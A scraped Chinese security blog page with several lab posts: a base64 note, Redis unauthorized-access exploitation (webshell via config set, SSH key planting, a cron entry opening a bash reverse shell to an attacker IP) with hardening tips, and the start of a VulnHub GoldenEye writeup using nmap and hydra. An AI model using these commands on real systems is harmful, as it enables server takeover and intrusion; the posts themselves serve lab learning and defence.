              <time title="创建时间：2021-07-01 18:03:11 / 修改时间：22:36:15" itemprop="dateCreated datePublished" datetime="2021-07-01T18:03:11+08:00">2021-07-01</time>
            </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>487</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>1 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>有些特殊字符没法以可打印字符的形式打印出来复制时，先编码一下，与url编码的原理相同</p>
<h1 id="使用及总结"><a href="#使用及总结" class="headerlink" title="使用及总结"></a>使用及总结</h1><p>使用：</p>
<p><img src="/2021/07/01/base-64/1.png"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">root@192: echo swanq &gt; 1</span><br><span class="line">root@192: echo circle &gt; 2</span><br><span class="line"></span><br><span class="line">root@192: diff -u 1 2 | base64 &gt; patch</span><br><span class="line"></span><br><span class="line">root@192: cat patch</span><br><span class="line">LS0tIDEJMjAyMS0wNy0wMSAyMjoyNDoxNy4wNzc3Mjc0MTAgKzA4MDAKKysrIDIJMjAyMS0wNy0wMSAyMjoyNDoyMy43OTc3Mjc2NzQgKzA4MDAKQEAgLTEgKzEgQEAKLXN3YW5xCitjaXJjbGUK</span><br><span class="line"></span><br><span class="line">root@192:&#x2F;home&#x2F;file# cat patch| base64 -d</span><br><span class="line">--- 1   2021-07-01 22:24:17.077727410 +0800</span><br><span class="line">+++ 2   2021-07-01 22:24:23.797727674 +0800</span><br><span class="line">@@ -1 +1 @@</span><br><span class="line">-swanq</span><br><span class="line">+circle</span><br></pre></td></tr></table></figure>

<p><img src="/2021/07/01/base-64/2.png"></p>
<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>以为base64会有什么神奇的功能，好吧，是我想多了…</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/" class="post-title-link" itemprop="url">redis未授权写定时任务反弹shell出错解析</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-17 19:49:00" itemprop="dateCreated datePublished" datetime="2021-06-17T19:49:00+08:00">2021-06-17</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-06-18 21:46:52" itemprop="dateModified" datetime="2021-06-18T21:46:52+08:00">2021-06-18</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>第二次在总结redis未授权利用方式写crontab时，使用的是Ubuntu，发现反弹shell失败。然而第一次用CentOs时却没有此问题出现。特此刨根问底总结一下原因。</p>
<h1 id="0x01-cron服务和crontab命令"><a href="#0x01-cron服务和crontab命令" class="headerlink" title="0x01 cron服务和crontab命令"></a>0x01 cron服务和crontab命令</h1><h2 id="1-cron和crontab"><a href="#1-cron和crontab" class="headerlink" title="1.cron和crontab"></a>1.cron和crontab</h2><p>Linux存在需要定期执行的任务-例行性工作，分为用户设置的例行性任务和系统层面的例行性任务，其中：</p>
<ul>
<li>cron：执行计划命令的守护程序，会每分钟检查是否有任务需要执行</li>
<li>crontab：维护某用户crontab 文件的命令</li>
<li>cron 会查找/var/spool/cron/crontabs/ 目录下的文件及 /etc/crontab 文件中所有 crontab 命令，并读入内存中。</li>
</ul>
<p>具体crontab和cron用man自行查看</p>
<h2 id="2-ubuntu的cron程序位置"><a href="#2-ubuntu的cron程序位置" class="headerlink" title="2.ubuntu的cron程序位置"></a>2.ubuntu的cron程序位置</h2><p>ubuntu下可利用的cron包括：</p>
<ul>
<li><p>/var/spool/cron/crontabs/：该目录下定义的任务计划文件会被执行，前提是该任务计划文件的<strong>权限必须为600</strong></p>
</li>
<li><p>/etc/crontab：该文件里面的任务计划可直接执行，负责调度各种管理和维护任务</p>
</li>
<li><p>/etc/cron.d/*：存放任何要执行的crontab文件或脚本。该目录下任意文件都可被当作任务计划执行，且避免原先任务计划文件被覆盖</p>
</li>
<li><p>还可以把脚本放在其他目录，包括</p>
<p>/etc/cron.hourly、/etc/cron.daily、/etc/cron.weekly、/etc/cron.monthly目录中，让它每小时/天/星期、月执行一次。</p>
</li>
</ul>
<blockquote>
<p>/etc/crontab参数含义：</p>
<p>m:分钟 - 从0到59的整数 </p>
<p>h:小时 - 从0到23的整数 </p>
<p>dom:天 - 从1到31的整数 (必须是指定月份的有效日期) </p>
<p>mon:月 - 从1到12的整数 (或如Jan或Feb简写的月份) </p>
<p>dow:周一到周日 - 从0到7的整数，0或7用来描述周日 (或用Sun或Mon简写来表示)</p>
<p>user:指的是执行命令的用户 </p>
<p>command: 需要执行的命令 </p>
<p><em>表示参数所有可用的值，如果为5个</em>，就代表每分钟执行一次 </p>
<p>/：指定步进设置。“/<interger>”表示步进值,比如*/2 * * * *代表每两分钟执行一次任务</interger></p>
</blockquote>
<h1 id="0x02-查找原因"><a href="#0x02-查找原因" class="headerlink" title="0x02 查找原因"></a>0x02 查找原因</h1><p>查看/var/log/syslog可找到相关日志。因syslog记录系统所有日志信息。</p>
<p>1.写/var/spool/cron目录时</p>
<p>提示命令执行出现错误，ubuntu会将这些错误信息输出到ubuntu系统的邮件服务器，但是ubuntu系统默认没有安装邮件服务器，所以导致了错误</p>
<p>错误原因包括：</p>
<ol>
<li>/var/spool/cron/crontabs/权限不对劲，并非600</li>
<li>ubuntu的cron的shell环境为/bin/sh</li>
</ol>
<p>针对原因2可采用第二种方式：</p>
<p>2.写/etc/cron.d目录时</p>
<p>此时step1先更改/bin/sh为/bash,step2使用bash反弹shell。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> aaa <span class="string">&quot;nnnn* * * * * root ln -s -f bash /bin/shnnnn&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/cron.d</span><br><span class="line">config <span class="built_in">set</span> dbfilename step1</span><br><span class="line">save</span><br><span class="line"><span class="built_in">set</span> bbb <span class="string">&quot;nnnn* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.101/7777 0&gt;&amp;1nnnn&quot;</span></span><br><span class="line">config <span class="built_in">set</span> dir /etc/cron.d</span><br><span class="line">config <span class="built_in">set</span> dbfilename step2</span><br><span class="line">save</span><br></pre></td></tr></table></figure>

<p>成功创建任务计划step1和step2，但是还是无法反弹shell。错误日志显示语法错误</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/14.png"></p>
<p>原因：redis向任务计划文件里写内容出现乱码而导致的语法错误。</p>
<ul>
<li>centos会忽略乱码去执行格式正确的任务计划</li>
<li>ubuntu并不会忽略这些乱码，所以导致命令执行失败，作为正常用户向/etc/cron.d目录下写任务计划文件时，命令可以正常执行。利用redis未授权访问写的任务计划文件里都有乱码，这些代码来自redis的缓存数据</li>
</ul>
<h1 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h1><p>具体环境搭建不再赘述</p>
<p>靶机：CentOS 192.168.140.132</p>
<p>攻击机：Kali  192.168.140.130</p>
<p>CentOS启动redis服务：</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/15.png"></p>
<p>kali监听本机9999端口的返回任务</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/17.png"></p>
<p>kali写入定时任务</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/16.png"></p>
<p>写入成功，直接拿到root下的bash</p>
<p><img src="/2021/06/17/redis%E5%86%99%E5%AE%9A%E6%97%B6%E4%BB%BB%E5%8A%A1%E5%87%BA%E9%94%99/18.png"></p>
<h1 id="0x04-总结"><a href="#0x04-总结" class="headerlink" title="0x04 总结"></a>0x04 总结</h1><p>ubuntu确实设计比centos安全，建议遇到ubuntu还是用其他两种方式。具体利用方式参考上一篇文章。</p>
<h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><ol>
<li><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/news/301606">https://cloud.tencent.com/developer/news/301606</a></li>
<li><a target="_blank" rel="noopener" href="https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/">https://www.dazhuanlan.com/2019/11/18/5dd20bda178db/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
<li>Linux日志排查：<a target="_blank" rel="noopener" href="https://baijiahao.baidu.com/s?id=1613381635234443098&amp;wfr=spider&amp;for=pc">https://baijiahao.baidu.com/s?id=1613381635234443098&amp;wfr=spider&amp;for=pc</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/" class="post-title-link" itemprop="url">redis未授权总结</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-06-04 22:32:04" itemprop="dateCreated datePublished" datetime="2021-06-04T22:32:04+08:00">2021-06-04</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-05 13:51:58" itemprop="dateModified" datetime="2021-07-05T13:51:58+08:00">2021-07-05</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.6k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>2 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前总结过的内容被自己的windows defender杀掉了，现哭着再总结一次。起因源于之前参加hvv遇到此洞，故而作此总结。</p>
<h1 id="0x01-概述"><a href="#0x01-概述" class="headerlink" title="0x01 概述"></a>0x01 概述</h1><p>用ANSI  C写的redis作为非关系型内存数据库，是key-value存储系统，且支持主从服务器同步。redis漏洞产生的原因一般是：</p>
<ul>
<li><strong>直接暴露在公网</strong>：绑定在 <code>0.0.0.0:6379</code>，且没有进行添加防火墙规则、避免其他非信任来源IP访问等相关安全策略</li>
<li><strong>没有设置密码认证</strong>(一般为空)：可以免密远程登录redis服务</li>
</ul>
<p>漏洞可能产生的危害:</p>
<p>攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以通过恶意执行flushall来清空所有数据<br>攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件<br>如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害者服务器</p>
<p>下图为redis拿shell的三种方式及其条件：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.jpg"></p>
<h1 id="0x02-环境搭建"><a href="#0x02-环境搭建" class="headerlink" title="0x02 环境搭建"></a>0x02 环境搭建</h1><p>靶机：Ubuntu 192.168.140.129</p>
<p>攻击机：kali 192.168.140.130</p>
<p>kali一键安装redis，sudo apt install redis</p>
<p>Ubuntu debian或其他环境安装指南：</p>
<p>安装：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">tar -xzvf redis-6.0.1.tar.gz</span><br><span class="line">mv redis-6.0.1 /usr/local/redis</span><br><span class="line">cd /usr/local/redis</span><br><span class="line">make &amp; make install</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 任意目录启动</span></span><br><span class="line">cp redis-server /usr/bin</span><br><span class="line">cp redis-cli /usr/bin</span><br><span class="line">cp redis.conf /etc</span><br></pre></td></tr></table></figure>

<p>配置：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 去掉仅对内网开放，加#</span><br><span class="line"># bind 127.0.0.1</span><br><span class="line"># redis关闭守护进程</span><br><span class="line">daemonize no</span><br><span class="line"># 关闭保护模式</span><br><span class="line">protected-mode no</span><br><span class="line"></span><br><span class="line"># 重启配置文件</span><br><span class="line">redis-server redis.conf</span><br><span class="line"># 关闭防火墙</span><br><span class="line">ufw disable</span><br></pre></td></tr></table></figure>

<p>当然，别忘了，ubuntu要启动redis-server服务。</p>
<p>为保证后面写入计划任务，此处以root权限启动redis</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/10.png"></p>
<h1 id="0x03-利用方式"><a href="#0x03-利用方式" class="headerlink" title="0x03 利用方式"></a>0x03 利用方式</h1><h2 id="1-写webshell"><a href="#1-写webshell" class="headerlink" title="1. 写webshell"></a>1. 写webshell</h2><h3 id="条件："><a href="#条件：" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>存在web目录</p>
<p>晓得绝对路径</p>
<p>当然还要有写入权限</p>
<h3 id="流程："><a href="#流程：" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>实际渗透过程中，这个方法通常需要搭配 phpinfo 等信息使用</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h  192.168.140.129 or 域名</span><br><span class="line">config set dir /var/www/html/</span><br><span class="line"><span class="meta">#</span><span class="bash"> 设置写入文件</span></span><br><span class="line">config set dbfilename 1.php</span><br><span class="line"><span class="meta">#</span><span class="bash"> 以键值对的形式写入一句话木马</span></span><br><span class="line">set webshell &quot;&lt;?php @eval($_POST[&#x27;swanq&#x27;]);?&gt;&quot;</span><br><span class="line"><span class="meta">#</span><span class="bash"> 保存写入硬盘</span></span><br><span class="line">save </span><br></pre></td></tr></table></figure>

<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/1.png"></p>
<p>最后用蚁剑连接即可：<code>http://192.168.127.139/1.php</code></p>
<h2 id="2-写ssh公钥"><a href="#2-写ssh公钥" class="headerlink" title="2. 写ssh公钥"></a>2. 写ssh公钥</h2><p>原理：Redis 未授权访问通过写 <code>/root/.ssh</code>下的authorized_keys 来拿权限</p>
<h3 id="条件：-1"><a href="#条件：-1" class="headerlink" title="条件："></a><strong>条件：</strong></h3><p>对外开启ssh服务</p>
<p>Redis 服务运行在 root 用户下（否则还要猜测用户）</p>
<h3 id="流程：-1"><a href="#流程：-1" class="headerlink" title="流程："></a><strong>流程：</strong></h3><p>生成本机ssh公私钥</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/2.png"></p>
<p>为防止脏数据污染公钥，在公钥内容上下加空行。之后将公钥写入key.txt</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/3.png"></p>
<blockquote>
<p>shell的echo :</p>
<p>用于字符串输出，其注意事项如下图所示：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/7.png"></p>
</blockquote>
<p>redis远程连接靶机，将公钥文件key.txt写入靶机</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/4.png"></p>
<blockquote>
<p>-x：read last argument from STDIN</p>
<p>cat key.txt | redis -h 192.168.140.129 -x set crack：</p>
<ul>
<li><p>cat key.txt 输出 作为后面的输入</p>
</li>
<li><p>-x 读取标准输入</p>
</li>
<li><p>set crack 是将读取的输入作为crack此参数内容</p>
<p>相当于把参数crack参数和-x读的数据组了个命令执行</p>
</li>
</ul>
</blockquote>
<p>找到靶机redis备份路径：</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/8.png"></p>
<p>更改redis备份路径为ssh公钥存放目录/home/glory/.ssh,默认情况为/root/.ssh。并设置上传公钥文件名为authorized_keys</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/5.png"></p>
<blockquote>
<p>config:可查看或设置配置项</p>
<p>dbfilename:备份文件</p>
</blockquote>
<p>SSH远程登陆成功</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/6.png"></p>
<h2 id="3-在crontab中写定时任务"><a href="#3-在crontab中写定时任务" class="headerlink" title="3. 在crontab中写定时任务"></a>3. 在crontab中写定时任务</h2><h3 id="条件：-2"><a href="#条件：-2" class="headerlink" title="条件："></a>条件：</h3><p>有可写计划任务的权限,将文件写入到计划目录下执行</p>
<p>多见于CentOs使用</p>
<h3 id="流程：-2"><a href="#流程：-2" class="headerlink" title="流程："></a>流程：</h3><p>攻击机监听本机9999端口，接收之后的反弹shell</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/9.png"></p>
<p>利用redis以root权限运行有可写计划任务的权限，写crontab</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/11.png"></p>
<blockquote>
<p>1./var/spool/cron目录存储每个用户生成的crontab文件</p>
<p>2.直接往当前用户的crontab中写反弹shell，必须要换行</p>
<p>3.* * * * * myCommand：1分钟执行一次myCommand</p>
<p>4.n个数大于2，否则文件内容里面的任务计划会出现乱码导致命令执行失败</p>
</blockquote>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/12.png"></p>
<p>观察到此时并无反弹shell。但是确实写入成功。</p>
<p><img src="/2021/06/04/redis%E6%9C%AA%E6%8E%88%E6%9D%83%E6%80%BB%E7%BB%93/13.png"></p>
<p>具体排查问题另起一篇博客说明。</p>
<h1 id="0x02-如何防护"><a href="#0x02-如何防护" class="headerlink" title="0x02 如何防护"></a>0x02 如何防护</h1><h4 id="1-禁止远程使用一些高危命令"><a href="#1-禁止远程使用一些高危命令" class="headerlink" title="1.禁止远程使用一些高危命令"></a>1.禁止远程使用一些高危命令</h4><p>我们可以通过修改redis.conf文件来禁用远程修改DB文件地址</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">rename-command FLUSHALL &quot;&quot;</span><br><span class="line">rename-command CONFIG   &quot;&quot;</span><br><span class="line">rename-command EVAL     &quot;&quot;</span><br></pre></td></tr></table></figure>

<h4 id="2-低权限运行Redis服务"><a href="#2-低权限运行Redis服务" class="headerlink" title="2.低权限运行Redis服务"></a>2.低权限运行Redis服务</h4><p>为Redis服务创建单独的<code>user</code>和<code>home</code>目录，并且配置禁止登陆</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">groupadd -r redis &amp;&amp; useradd -r -g redis redis</span><br></pre></td></tr></table></figure>

<h4 id="3-为Redis添加密码验证"><a href="#3-为Redis添加密码验证" class="headerlink" title="3.为Redis添加密码验证"></a>3.为Redis添加密码验证</h4><p>我们可以通过修改redis.conf文件来为Redis添加密码验证</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">requirepass mypassword</span><br></pre></td></tr></table></figure>

<h4 id="4-禁止外网访问-Redis"><a href="#4-禁止外网访问-Redis" class="headerlink" title="4.禁止外网访问 Redis"></a>4.禁止外网访问 Redis</h4><p>我们可以通过修改redis.conf文件来使得Redis服务只在当前主机可用</p>
<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bind 127.0.0.1</span><br></pre></td></tr></table></figure>

<h1 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h1><ol>
<li>下载链接：<a target="_blank" rel="noopener" href="http://download.redis.io/releases/redis-6.0.1.tar.gz">http://download.redis.io/releases/redis-6.0.1.tar.gz</a></li>
<li><a target="_blank" rel="noopener" href="https://hejueyun.github.io/posts/2218125b/">https://hejueyun.github.io/posts/2218125b/</a></li>
<li><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/223432.html">https://www.freebuf.com/vuls/223432.html</a></li>
<li>redis相关：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/241146">https://www.anquanke.com/post/id/241146</a></li>
<li>corntab命令参考：<a target="_blank" rel="noopener" href="https://www.runoob.com/w3cnote/linux-crontab-tasks.html">https://www.runoob.com/w3cnote/linux-crontab-tasks.html</a></li>
</ol>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://swanq.top/2021/05/28/VulnHub-GoldenEye/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/author.jpg">
      <meta itemprop="name" content="swanQ">
      <meta itemprop="description" content="Try & Enjoy">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="SwanQ's Blue SKY">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/05/28/VulnHub-GoldenEye/" class="post-title-link" itemprop="url">VulnHub靶机系列：GoldenEye渗透Writeup</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>

              <time title="创建时间：2021-05-28 16:50:10" itemprop="dateCreated datePublished" datetime="2021-05-28T16:50:10+08:00">2021-05-28</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">更新于</span>
                <time title="修改时间：2021-07-04 12:41:10" itemprop="dateModified" datetime="2021-07-04T12:41:10+08:00">2021-07-04</time>
              </span>

          
            <span class="post-meta-item" title="本文字数">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>2.9k</span>
            </span>
            <span class="post-meta-item" title="阅读时长">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>3 分钟</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>定个小目标，把50台vulhub玩一遍，探探其中奥秘。当然最终目标是获取root权限或者admin账号密码。本靶场目标是获取root目录下flag.txt文件。</p>
<h1 id="0x01-靶机环境"><a href="#0x01-靶机环境" class="headerlink" title="0x01 靶机环境"></a>0x01 靶机环境</h1><p>靶机：GoldenEye 192.168.140.133</p>
<p>攻击机：kali 192.168.140.128</p>
<h1 id="0x02-信息收集"><a href="#0x02-信息收集" class="headerlink" title="0x02 信息收集"></a>0x02 信息收集</h1><h2 id="获取目标IP"><a href="#获取目标IP" class="headerlink" title="获取目标IP"></a>获取目标IP</h2><p>首先需要找到攻击目标,nmap -sP 192.168.140.0/24</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/1.png"></p>
<h2 id="端口及服务扫描"><a href="#端口及服务扫描" class="headerlink" title="端口及服务扫描"></a>端口及服务扫描</h2><p>找到IP地址之后去探测目标机子上开了哪些服务和端口 </p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sV -vv -p 1-65535 192.168.140.133</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/28/VulnHub-GoldenEye/2.png"></p>
<p>共开放了4个端口，80端口web服务不可以访问。第一次遇到这种问题。nmap既然可以扫描到靶机，说明攻击机和靶机之间可以ping通，再试试宿主机ping虚拟机，发现不可以，查询ip之后，发现宿主机和虚拟机并不在同一个网段上，那就改了罢</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/3.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/4.png"></p>
<h2 id="网站信息收集"><a href="#网站信息收集" class="headerlink" title="网站信息收集"></a>网站信息收集</h2><p>成功ping通，访问web服务，同时也解决掉了之前MobaXterm的疑惑</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/5.png"></p>
<p>看到此图的提示，进入/sev-home/目录中，发现登陆框，一定是要找相关用户名和密码。回到刚才的首页，F12看到terminal.js。</p>
<p>通过报错信息也可看到中间件为apache</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/6.png"></p>
<p>访问terminal.js看到以下信息</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/7.png"></p>
<p>用burp的decoder模块解密密码，登陆成功，此处用户名一定是小写。</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/8.png"></p>
<blockquote>
<p>加密格式总结：</p>
<ul>
<li>Unicode：\u开头</li>
<li>UTF8/URL：%开头</li>
<li>UTF16：\x开头</li>
<li>&amp;#73;：　73为ASCII码，对应I</li>
</ul>
</blockquote>
<p>靶机在某个较高端口上开了pop3服务，此处指55007。pop3为邮件服务器</p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/9.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/10.png"></p>
<p><img src="/2021/05/28/VulnHub-GoldenEye/19.png"></p>
<p>terminal.js中写道，make sure you update your default password(建议改成make sure to update your passwd),也就是说目前是默认密码。用户名为boris,暴力破解</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -L 1.txt -P /usr/share/wordlists/fasttrack.txt  192.168.140.133 -s 55007 pop3</span><br></pre></td></tr></table></figure>

<p><img src="/2021/05/28/VulnHub-GoldenEye/11.png"></p>
